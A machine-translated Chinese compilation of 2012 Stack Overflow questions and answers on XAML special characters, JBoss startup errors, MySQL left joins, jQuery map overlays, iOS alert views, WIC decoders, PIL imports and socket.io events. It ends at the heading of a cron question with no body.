我正在尝试将按钮的内容设置为 XAML `(`、`}`、`<`、`{`和`)`. 但是，当我把它放在`Content=""`标签中时，程序没有编译，我被告知我的 XAML 无效。

如何将这些字符用于按钮的文本？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:36:35.860

这适用于 XAML 文件中的所有特殊字符。

```
Button Content="{Binding Source= \{}" 
```

我`\`在`{`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-30T16:28:48.413

您可以使用字符代码。运行charmap并选择您正在使用的字体并查看您想要的字符的字符代码。然后使用下面的格式设置内容。

```
<Button Content="&#x0028;" FontFamily="Segoe UI Symbol" Width="100" Height="100"/> 
```

( = 0028

} = 007D

< = 003C

{ = 007B

) = 0029

# jboss - 启动 JBoss 服务器时出错

> ID：10811211
> 
> 赞同：1
> 
> 时间：2012-05-30T06:44:52.717
> 
> 标签：jboss, jboss-4.2.x

我正在尝试从 Eclipse 启动 JBoss 服务器，但我遇到了一些异常，如下所示。后来我也尝试从命令提示符但仍然得到相同的异常

```
01:35:49,227 ERROR [STDERR] java.io.FileNotFoundException: C:\Servers\jboss-4.2.3\server\default\data\tx-object-store\HashedActionStore\defaultStore\Recovery\TransactionStatusManager\#161#\-3f5796f4_caed_4fc48ed7_0 (Access is denied)
01:35:49,227 ERROR [STDERR]     at java.io.FileOutputStream.open(Native Method)
01:35:49,227 ERROR [STDERR]     at java.io.FileOutputStream.<init>(Unknown Source)
01:35:49,227 ERROR [STDERR]     at java.io.FileOutputStream.<init>(Unknown Source)
01:35:49,227 ERROR [STDERR]     at com.arjuna.ats.internal.arjuna.objectstore.ShadowingStore.write_state(ShadowingStore.java:749)
01:35:49,227 ERROR [STDERR]     at com.arjuna.ats.internal.arjuna.objectstore.FileSystemStore.write_committed(FileSystemStore.java:209)
01:35:49,227 ERROR [STDERR]     at com.arjuna.ats.arjuna.objectstore.ObjectStore.write_committed(ObjectStore.java:281)
01:35:49,227 ERROR [STDERR]     at com.arjuna.ats.internal.arjuna.recovery.TransactionStatusManagerItem.saveThis(TransactionStatusManagerItem.java:300)
01:35:49,227 ERROR [STDERR]     at com.arjuna.ats.internal.arjuna.recovery.TransactionStatusManagerItem.markAsDead(TransactionStatusManagerItem.java:117)
01:35:49,227 ERROR [STDERR]     at com.arjuna.ats.internal.arjuna.recovery.TransactionStatusConnector.setDeadTSM(TransactionStatusConnector.java:193)
01:35:49,227 ERROR [STDERR]     at com.arjuna.ats.internal.arjuna.recovery.TransactionStatusConnector.test(TransactionStatusConnector.java:83)
01:35:49,227 ERROR [STDERR]     at com.arjuna.ats.internal.arjuna.recovery.ExpiredTransactionStatusManagerScanner.scan(ExpiredTransactionStatusManagerScanner.java:147)
01:35:49,227 ERROR [STDERR]     at com.arjuna.ats.internal.arjuna.recovery.ExpiredEntryMonitor.run(ExpiredEntryMonitor.java:212) 
```

并且

```
java.sql.SQLException: The database is already in use by another process: org.hsqldb.persist.NIOLockFile@f3788b66[file =C:\Servers\jboss-4.2.3\server\default\data\hypersonic\localDB.lck, exists=true, locked=false, valid=false, fl =null]: java.io.FileNotFoundException: C:\Servers\jboss-4.2.3\server\default\data\hypersonic\localDB.lck (Access is denied)
    at org.hsqldb.jdbc.Util.sqlException(Unknown Source)
    at org.hsqldb.jdbc.jdbcConnection.<init>(Unknown Source)
    at org.hsqldb.jdbcDriver.getConnection(Unknown Source)
    at org.hsqldb.jdbcDriver.connect(Unknown Source)
    at java.sql.DriverManager.getConnection(Unknown Source)
    at java.sql.DriverManager.getConnection(Unknown Source)
    at org.jboss.jdbc.HypersonicDatabase.getConnection(HypersonicDatabase.java:768)
    at org.jboss.jdbc.HypersonicDatabase.startStandaloneDatabase(HypersonicDatabase.java:618)
    at org.jboss.jdbc.HypersonicDatabase.startService(HypersonicDatabase.java:564)
    at org.jboss.system.ServiceMBeanSupport.jbossInternalStart(ServiceMBeanSupport.java:289)
    at org.jboss.system.ServiceMBeanSupport.jbossInternalLifecycle(ServiceMBeanSupport.java:245)
    at sun.reflect.GeneratedMethodAccessor3.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:155)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:94)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:86)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:659)
    at org.jboss.system.ServiceController$ServiceProxy.invoke(ServiceController.java:978)
    at $Proxy0.start(Unknown Source)
    at org.jboss.system.ServiceController.start(ServiceController.java:417)
    at sun.reflect.GeneratedMethodAccessor9.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:155)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:94)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:86)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:659)
    at org.jboss.mx.util.MBeanProxyExt.invoke(MBeanProxyExt.java:210)
    at $Proxy4.start(Unknown Source)
    at org.jboss.deployment.SARDeployer.start(SARDeployer.java:304)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:155)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:94)
    at org.jboss.mx.interceptor.AbstractInterceptor.invoke(AbstractInterceptor.java:133)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.interceptor.ModelMBeanOperationInterceptor.invoke(ModelMBeanOperationInterceptor.java:142)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:659)
    at org.jboss.mx.util.MBeanProxyExt.invoke(MBeanProxyExt.java:210)
    at $Proxy42.start(Unknown Source)
    at org.jboss.deployment.XSLSubDeployer.start(XSLSubDeployer.java:197)
    at org.jboss.deployment.MainDeployer.start(MainDeployer.java:1025)
    at org.jboss.deployment.MainDeployer.deploy(MainDeployer.java:819)
    at org.jboss.deployment.MainDeployer.deploy(MainDeployer.java:782)
    at sun.reflect.GeneratedMethodAccessor21.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:155)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:94)
    at org.jboss.mx.interceptor.AbstractInterceptor.invoke(AbstractInterceptor.java:133)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.interceptor.ModelMBeanOperationInterceptor.invoke(ModelMBeanOperationInterceptor.java:142)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:659)
    at org.jboss.mx.util.MBeanProxyExt.invoke(MBeanProxyExt.java:210)
    at $Proxy9.deploy(Unknown Source)
    at org.jboss.deployment.scanner.URLDeploymentScanner.deploy(URLDeploymentScanner.java:421)
    at org.jboss.deployment.scanner.URLDeploymentScanner.scan(URLDeploymentScanner.java:634)
    at org.jboss.deployment.scanner.AbstractDeploymentScanner$ScannerThread.doScan(AbstractDeploymentScanner.java:263)
    at org.jboss.deployment.scanner.AbstractDeploymentScanner.startService(AbstractDeploymentScanner.java:336)
    at org.jboss.system.ServiceMBeanSupport.jbossInternalStart(ServiceMBeanSupport.java:289)
    at org.jboss.system.ServiceMBeanSupport.jbossInternalLifecycle(ServiceMBeanSupport.java:245)
    at sun.reflect.GeneratedMethodAccessor3.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:155)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:94)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:86)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:659)
    at org.jboss.system.ServiceController$ServiceProxy.invoke(ServiceController.java:978)
    at $Proxy0.start(Unknown Source)
    at org.jboss.system.ServiceController.start(ServiceController.java:417)
    at sun.reflect.GeneratedMethodAccessor9.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:155)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:94)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:86)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:659)
    at org.jboss.mx.util.MBeanProxyExt.invoke(MBeanProxyExt.java:210)
    at $Proxy4.start(Unknown Source)
    at org.jboss.deployment.SARDeployer.start(SARDeployer.java:304)
    at org.jboss.deployment.MainDeployer.start(MainDeployer.java:1025)
    at org.jboss.deployment.MainDeployer.deploy(MainDeployer.java:819)
    at org.jboss.deployment.MainDeployer.deploy(MainDeployer.java:782)
    at org.jboss.deployment.MainDeployer.deploy(MainDeployer.java:766)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:155)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:94)
    at org.jboss.mx.interceptor.AbstractInterceptor.invoke(AbstractInterceptor.java:133)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.interceptor.ModelMBeanOperationInterceptor.invoke(ModelMBeanOperationInterceptor.java:142)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:659)
    at org.jboss.mx.util.MBeanProxyExt.invoke(MBeanProxyExt.java:210)
    at $Proxy5.deploy(Unknown Source)
    at org.jboss.system.server.ServerImpl.doStart(ServerImpl.java:482)
    at org.jboss.system.server.ServerImpl.start(ServerImpl.java:362)
    at org.jboss.Main.boot(Main.java:200)
    at org.jboss.Main$1.run(Main.java:508)
    at java.lang.Thread.run(Unknown Source) 
```

我还设置了环境变量 JAVA_HOME 和 JBOSS_HOME 我使用 Postgresql 作为数据库。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:54:05.090

那些“访问被拒绝”错误可能是由于 ntfs 权限不足造成的。在最近的尝试之前，这个 JBoss 实例似乎是在不同的用户下运行的。那次启动创建了一些文件，只有第一个用户可以访问，而第二个用户不能访问。

可能的解决方案：

*   手动删除问题文件
*   [修复ntfs权限](http://support.microsoft.com/kb/810881/en-us?fr=1)
*   [以管理员权限运行 jboss](http://technet.microsoft.com/en-us/magazine/ff431742.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T11:00:39.867

请按照以下步骤操作

1.  关闭 JBOSS 并在之后出现 Eclipse
2.  从 jboss-6.0.0.Final\server\default\data\hypersonic 中删除文件；localDB.backup、localDB.data、localDB.lck、localDB.log、localDB.properties 和 localDB.script
3.  启动 Eclipse，然后启动 JBoss 服务器。

对我来说效果很好

谢谢

# mysql - 通过连接获取第二个表中不存在的记录

> ID：10811212
> 
> 赞同：1
> 
> 时间：2012-05-30T06:44:54.840
> 
> 标签：mysql, null, left-join

我需要以下结果集中 pid 为 NULL 的记录：

```
pid    users_fee_schedule_students_name users_fee_schedule_students_uid

8       users                   6           MBA in IT   1   1337097600  3   6   user    250000
9       users                   6           MBA in IT   2   1337184000  3   7   user    250000
NULL    ashuser                 277         MBA in IT   1   1337097600  3   6   user    250000
NULL    ashuser                 277         MBA in IT   2   1337184000  3   7   user    250000
10      sriuser                 66          MBA in IT   1   1337097600  3   6   user    250000
NULL    sriuser                 66          MBA in IT 
```

我 SQL 查询得到上述结果集是

```
SELECT FSP.pid,  users_fee_schedule_students.name AS users_fee_schedule_students_name, users_fee_schedule_students.uid AS users_fee_schedule_students_uid, fee_schedule.name AS fee_schedule_name, fee_schedule_instalments.instalment_no AS fee_schedule_instalments_instalment_no, fee_schedule_instalments.payable_by AS fee_schedule_instalments_payable_by, fee_schedule.fid AS fid, fee_schedule_instalments.iid AS fee_schedule_instalments_iid, 'user' AS field_data_field_school_course_user_entity_type, SUM(fee_schedule_instalments.amount) AS fee_schedule_instalments_amount
FROM 
ic_fee_schedule AS fee_schedule
LEFT JOIN ic_fee_schedule_students AS fee_schedule_students ON fee_schedule.fid = fee_schedule_students.fid
LEFT JOIN ic_users AS users_fee_schedule_students ON fee_schedule_students.uid = users_fee_schedule_students.uid
LEFT JOIN ic_fee_schedule_instalments AS fee_schedule_instalments ON fee_schedule.fid = fee_schedule_instalments.fid
LEFT JOIN ic_fee_schedule_payments AS FSP ON fee_schedule.fid = FSP.fid AND fee_schedule_students.uid = FSP.uid AND fee_schedule_instalments.iid = FSP.iid
WHERE (( (fee_schedule.fid = '3' ) ))
GROUP BY users_fee_schedule_students_name, users_fee_schedule_students_uid, fee_schedule_name, fee_schedule_instalments_instalment_no, fee_schedule_instalments_payable_by, fid , fee_schedule_instalments_iid 
```

我认为 LEFT JOIN ic_fee_schedule_payments AS FSP 需要更改为其他类型的连接。检查它......

在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:01:25.177

试过这个：

```
SELECT * FROM TableA
LEFT OUTER JOIN TableB
ON TableA.name = TableB.name
WHERE TableB.id IS null 
```

为了只在表 A 中而不在表 B 中生成记录集，我们执行相同的左外连接，然后通过 where 子句从右侧排除我们不想要的记录。

[http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html](http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:51:22.023

我相信您可以简单地添加一个 WHERE 子句“AND FSP.pid IS NULL”，因为您正在 FSP 上进行左连接。

尝试这个：

```
SELECT FSP.pid,  users_fee_schedule_students.name AS users_fee_schedule_students_name, users_fee_schedule_students.uid AS users_fee_schedule_students_uid, fee_schedule.name AS fee_schedule_name, fee_schedule_instalments.instalment_no AS fee_schedule_instalments_instalment_no, fee_schedule_instalments.payable_by AS fee_schedule_instalments_payable_by, fee_schedule.fid AS fid, fee_schedule_instalments.iid AS fee_schedule_instalments_iid, 'user' AS field_data_field_school_course_user_entity_type, SUM(fee_schedule_instalments.amount) AS fee_schedule_instalments_amount
FROM ic_fee_schedule AS fee_schedule
LEFT JOIN ic_fee_schedule_students AS fee_schedule_students ON fee_schedule.fid = fee_schedule_students.fid
LEFT JOIN ic_users AS users_fee_schedule_students ON fee_schedule_students.uid = users_fee_schedule_students.uid
LEFT JOIN ic_fee_schedule_instalments AS fee_schedule_instalments ON fee_schedule.fid = fee_schedule_instalments.fid
LEFT JOIN ic_fee_schedule_payments AS FSP ON fee_schedule.fid = FSP.fid AND fee_schedule_students.uid = FSP.uid AND fee_schedule_instalments.iid = FSP.iid
WHERE fee_schedule.fid = '3'
AND FSP.pid IS NULL
GROUP BY users_fee_schedule_students_name, users_fee_schedule_students_uid, fee_schedule_name, fee_schedule_instalments_instalment_no, fee_schedule_instalments_payable_by, fid , fee_schedule_instalments_iid 
```

# jquery - 在加载的页面中执行 javascript

> ID：10811218
> 
> 赞同：0
> 
> 时间：2012-05-30T06:45:18.980
> 
> 标签：jquery, google-maps, google-maps-api-3, jquery-tools

我的用户最近告诉我，默认页面的加载速度比以前慢得多。我认为这是因为地图在页面加载时立即加载。有没有办法将它延迟到单击单击此处按钮？

* * *

根据迄今为止从答案中收到的建议，我决定从外部 URL 调用地图。但加载页面上的 Javascript 未执行。我可以解决这个问题吗？

谢谢！

这就是我调用外部页面的方式。

```
$(function() {

    // if the function argument is given to overlay,
    // it is assumed to be the onBeforeLoad event listener
    $("a[rel]").overlay({

        mask: 'darkred',
        effect: 'apple',

        onBeforeLoad: function() {

            // grab wrapper element inside content
            var wrap = this.getOverlay().find(".contentWrap");

            // load the page specified in the trigger
            wrap.load(this.getTrigger().attr("href"));
        }

    });
});
<!-- external page is given in the href attribute (as it should be) -->
<a href="default.cs.asp?Process=ViewCheckinMap" rel="#overlay" style="text-decoration:none">
  <!-- remember that you can use any element inside the trigger -->
  <button type="button">Show external page in overlay</button>
</a> 
```

这是没有执行的。

```
<script>
      function initialize() {
        var data = <%=Data%>;
        var center = new google.maps.LatLng(48.404840395764175, 2.6845264434814453);

        var map = new google.maps.Map(document.getElementById('map'), {
          zoom: 2,
          center: center,
          mapTypeId: google.maps.MapTypeId.ROADMAP
        });

        var markers = [];
        for (var i = 0; i < data.users.length; i++) {
          var location = data.users[i];
          var latLng = new google.maps.LatLng(location.latitude,
              location.longitude);
          var marker = new google.maps.Marker({
            position: latLng
          });
          markers.push(marker);
        }
        var markerCluster = new MarkerClusterer(map, markers);
      }
      google.maps.event.addDomListener(window, 'click', initialize);
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:47:45.177

关于你改变的问题：

消除`google.maps.event.addDomListener(window, 'click', initialize);`

更改`wrap.load(this.getTrigger().attr("href"));`为：

```
wrap.load(this.getTrigger().attr("href"), function(){initialize();}); 
```

这应该在加载外部 javascript 之后立即初始化您的地图。

未测试:(

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:32:19.477

这意味着您需要使用 ajax 加载的外部页面。

为此，请创建一个新的 html 页面。并将其命名为 map.html。在*map.html*页面中，只需输入您的谷歌地图代码。

为您的默认页面`<a href="map.htm" rel="#overlay">Click here to open the map</a>`。

之后，您的地图将加载到 . 使用 ajax 方法的*contentWrap div。*

```
<!-- overlayed element -->
 <div class="apple_overlay" id="overlay">
  <!-- the external content is loaded inside this tag (map.html) -->
  <div class="contentWrap"></div>
 </div> 
```

*.contentWrap*的 CSS

 *```
/* container for external content. uses vertical scrollbar, if needed */
div.contentWrap {
height: 400px; // it is the same height of the #map div
overflow-y:auto;
} 
```*

# ios - UIAlertView 中的 UIAlertVIew

> ID：10811223
> 
> 赞同：-3
> 
> 时间：2012-05-30T06:45:22.147
> 
> 标签：ios, cocoa-touch, uialertview

```
-(IBAction) secondTwoSlotSettings: (id)sender{
        UIAlertView *secondTwoSlotSettings = [[UIAlertView alloc] initWithTitle:@""
                                                                        message:@""
                                                                       delegate:self
                                                              cancelButtonTitle:@"キャンセル"
                                                              otherButtonTitles:@"2スロット カメラ",@"2スロット カメラロール", nil];

        [secondTwoSlotSettings show];   
    }

    -(IBAction) firstTwoSlotSettings: (id)sender{
        UIAlertView *firstTwoSlotSettingsMessage = [[UIAlertView alloc] initWithTitle:@""
                                                                              message:@""
                                                                             delegate:self
                                                                    cancelButtonTitle:@"キャンセル"
                                                                    otherButtonTitles:@"1スロット",@"２スロット", nil];

        [firstTwoSlotSettingsMessage show];   

    }

    -(IBAction) oneSlotSettings: (id)sender{
        UIAlertView *oneSlotSettingsMessage = [[UIAlertView alloc] initWithTitle:@""
                                                                         message:@""
                                                                        delegate:self
                                                               cancelButtonTitle:@"キャンセル"
                                                               otherButtonTitles:@"カメラ",@"カメラロール", nil];

        [oneSlotSettingsMessage show];   
    }

    - (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex
    {
        NSString *title = [alertView buttonTitleAtIndex:buttonIndex];

        if([title isEqualToString:@"キャンセル"])
        {

            NSLog(@"キャンセル was selected.");
        }
        else if([title isEqualToString:@"はい"])
        {
            NSLog(@"はい was selected.");
        }
        else if([title isEqualToString:@"2スロット カメラ"])
        {
            NSLog(@"2スロット カメラ was selected.");
        }

        else if([title isEqualToString:@"1スロット"])
        {
            NSLog(@"1スロット was selected.");

        }
        else if([title isEqualToString:@"2スロット"])
        {
            NSLog(@"2スロット was selected.");
            UIAlertView *oneSlotSettingsMessage = [[UIAlertView alloc] initWithTitle:@""
                                                                             message:@""
                                                                            delegate:self
                                                                   cancelButtonTitle:@"キャンセル"
                                                                   otherButtonTitles:@"2スロット カメラ",@"2スロット カメラロール", nil];

            [oneSlotSettingsMessage show];   

        }
        else if([title isEqualToString:@"カメラ"])
        {
            NSLog(@"カメラ was selected.");

        }
        else if ([title isEqualToString:@"カメラロール"])
        {
            NSLog(@"カメラロール was selected.");

    } 
```

这是我的代码：

我只能显示 firstTwoSlotSettings 和 oneSlotSettings。但是当我尝试显示 secondTwoSlotSettings 它消失了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T06:49:01.027

否 Apple 的 UIAlertView 不可能。当您呈现 alertView 时，它将以模态形式出现在所有其他视图中，并关闭屏幕中已经存在的任何其他警报。

您可以做的一件事是创建一个自定义视图作为您的警报并为其呈现/关闭动作设置动画？然后你可以控制做任何你想做的事情..

# iphone - 在 ios 中使用 ASIHTTPRequest 加载 Web 视图需要更多时间

> ID：10811228
> 
> 赞同：4
> 
> 时间：2012-05-30T06:45:46.690
> 
> 标签：iphone, ios, asihttprequest

在我的基于浏览器的应用程序中，我需要为每个 url 设置一个代理，并在 ASIHTTPRequest 的帮助下执行此操作。

我面临的问题是 Web 视图需要双倍的时间来加载页面，可能是因为我在代码中加载了两次页面。

首先，我使用 ASIHTTPRequest 检查状态以确定 ASIHTTPRequest 是否允许加载页面，如果允许，则在 web 视图上加载该 url。这就是我认为问题所在，因为我认为我正在加载 url 两次，这很耗时。

您能否就其他加载页面的方式提出建议，但以支持使用代理设置检查经过身份验证的页面的方式，或为我提供与此问题相关的指南链接？

```
NSString *response = [NSString stringWithContentsOfFile:
    [theRequest downloadDestinationPath] encoding:[theRequest responseEncoding] error:nil];
    int statusCode = [requestH responseStatusCode];
    if (statusCode == 200) {
        [webV loadRequest:[NSURLRequest  requestWithURL:[requestH url]]];
    }
    else {
        [webV loadHTMLString:response baseURL:[theRequest url]];
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T08:53:57.253

实现 NSURLConnection ( [apple docu](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/URLLoadingSystem/Tasks/UsingNSURLConnection.html#//apple_ref/doc/uid/20001836-BAJEAIEE) ) 的委托方法，并在 connectionDidFinishLoading 中将 url 的内容保存到本地文件，然后使用 loadHTMLString 加载该本地文件。

# .net - WIC CreateDecoderFromStream 返回 0x88982F50 后服务器迁移

> ID：10811229
> 
> 赞同：3
> 
> 时间：2012-05-30T06:45:58.030
> 
> 标签：.net, vb.net, windows-server-2008, windows-server-2008-r2, wic

我有一个使用 WIC 为 .NET 应用程序创建的缩略图生成例程。过去一年它一直运行良好，但我们刚刚迁移到新服务器。

旧服务器是 W2k8 R2 Enterprise SP1 新服务器是 W2k8 Standard SP1

这是失败的代码

```
 Public Sub New(ByVal PictureData As Byte())
        Me.WICFactory = New WICImagingFactory()

        Dim InputStream As IWICStream = WICFactory.CreateStream()
        InputStream.InitializeFromMemory(PictureData, PictureData.Length)

        InputDecoder = WICFactory.CreateDecoderFromStream(InputStream, Nothing, WICDecodeOptions.WICDecodeMetadataCacheOnDemand)

        '^===== This line throws the HRESULT 0x88982F50 
```

我查过了，图片数据是有效数据。如果我在旧服务器上运行代码，完全相同的图片可以正常工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-31T22:59:04.750

那是 WINCODEC_ERR_COMPONENTNOTFOUND。这意味着 WIC 无法找到为您的流中的文件类型注册的解码器类。

这是我的建议：

在它工作的旧服务器上，打印出 InputDecoder.GetDecoderInfo().GetCLSID() 的值，也许还有 GetAuthor/GetFriendlyName。[如果它是此处](http://msdn.microsoft.com/en-us/library/ee719882%28v=vs.85%29.aspx)列出的内置 CLSID 之一，那么您的新机器上的 WIC 可能已损坏。否则，您将需要弄清楚您在旧机器上使用的解码器来自哪里，并将其安装到新机器上。

或者只是为您拥有的任何类型的文件寻找解码器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-04T10:56:33.337

问题是我运行的是 Server 2008 SP1。如[本](https://stackoverflow.com/questions/9335428/version-of-windows-imaging-component)问题所述，您需要在 WIC 可用之前将平台更新应用到 Server 2008（SP2 后）。（它在 R2 中本机可用）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-09-12T04:37:44.200

以前版本的 Windows Windows Vista SP2 /Server 2008 SP2 + KB971644。没有 GUID_ContainerFormatWmp，因此无法自动检测图像格式。

我们应该使用以下代码。

```
CoCreateInstance(CLSID_WICWmpDecoder,NULL, CLSCTX_INPROC_SERVER,IID_IWICBitmapDecoder,(LPVOID*)&inputDecoder); 
```

# python - Python PIL Image Module ImportError：没有名为 PIL 的模块，没有名为 Image 的模块

> ID：10811231
> 
> 赞同：1
> 
> 时间：2012-05-30T06:46:02.787
> 
> 标签：python, shell, python-2.7, python-imaging-library

[我已经按照此处](http://blog.hackedexistence.com/mediatemple-centos-5-5-ve-server-build-django-1-3-python-2-7-mysql-5-5-php-5-3)的说明安装了 Python 2.7 和 Python 2.4 。**当通过连接到服务器的 Mac OSX 终端**运行测试以确认安装工作正常时，我执行此测试：

```
import Image
img = Image.open("/directory/image.jpg")
img.load()
print img 
```

结果：

```
<PixelAccess object at 0x2b97d4c25110>
<JpegImagePlugin.JpegImageFile image mode=RGB size=75x75 at 0xFEF4050> 
```

但是，当使用 PHP`exec()`或通过 Coda 扩展[Run Script](http://joebergantine.com/werkstatt/run-script) for Coda 执行此操作时，我收到错误消息：

```
ImportError: No module named Image 
```

我也试过`from PIL import Image`这没有什么区别。还有一点需要注意的是，当我检查以确保支持存在时，我得到了这表明正确的图像支持可用：

```
*** TKINTER support not available
--- JPEG support available
--- ZLIB (PNG/ZIP) support available
--- FREETYPE2 support available
*** LITTLECMS support not available 
```

**问题：**关于如何解决这个问题的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T20:31:52.420

通过 exec() 调用运行时，确保您的 PYTHONPATH 正确。

```
Import sys
print sys.path
sys.path.append ("<path of Image>") 
```

您还可以在运行时动态加载模块以确保其可用，前提是它在标准位置可用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T06:47:16.030

PHP 运行的 Python 版本错误。指定`python`可执行文件的完整路径。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T06:59:47.877

@stwhite 我建议您将 virtualenv ( [http://www.virtualenv.org/en/latest/index.html](http://www.virtualenv.org/en/latest/index.html) ) 用于多个项目以生活在自己的环境中。

virtualenv 的有用包装器[http://www.doughellmann.com/projects/virtualenvwrapper/](http://www.doughellmann.com/projects/virtualenvwrapper/)

我自己的项目生活在他们自己的 virtualenvs 中，它真的很棒。

这是关于使用特定 python 版本创建 virtualenv 的问题[使用不同的 Python 版本和 virtualenv](https://stackoverflow.com/questions/1534210/use-different-python-version-with-virtualenv)

**注意** 在将 PIL 安装到 virtualenv 时可能会遇到问题

**解决方案**

```
First install XCode with gcc support,
deactivate <virtualenv_name>
cd ../ (virtualenvs root)
pip install -E <virtualenv_name/> PIL 
```

希望这对你也有用，

谢谢，

苏丹

# javascript - socket.io 开始和完成事件

> ID：10811240
> 
> 赞同：0
> 
> 时间：2012-05-30T06:46:45.387
> 
> 标签：javascript, node.js, express, socket.io

我正在使用带有 express 3 的 socket.io 来构建一个应用程序。

我想将加载器动画设置为在收到消息时显示，并在收到消息时隐藏它。很像 jQuerys ，`.ajaxStart`我`.ajaxComplete`可以在哪里做类似的事情`$('#loader').show();`

我可以在 socket.io 中捕获任何事件来实现这一点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:18:35.503

您可以使用以下想法实现此目的：

1.  服务器：发出`about_to_start`事件；
2.  CLIENT：`about_to_start`启用加载器并发出`download_ready`事件；
3.  SERVER：on `download_ready`event 发送数据，即发出`download`事件；
4.  客户：在`download`事件中对数据做一些事情并禁用加载器；

我就是这样做的。

顺便说一句：我们是在谈论简单的消息传递系统吗？我认为在这种情况下没有必要这样做。下载不会超过几秒钟，如果会，那么你需要优化应用程序或增加一些马力（即如果流量太大，添加一些机器）。跳过第 1,2 步和第 3 步的一半。在第 4 步中，您只需通知客户：“嘿，您有一条新消息！”。

# cron - 如何创建 cron 语句以运行多个小时

> ID：10811241
> 
> 赞同：41
> 
> 时间：2012-05-30T06:46:50.337
> 
> 标签：cron, crontab, cron-task

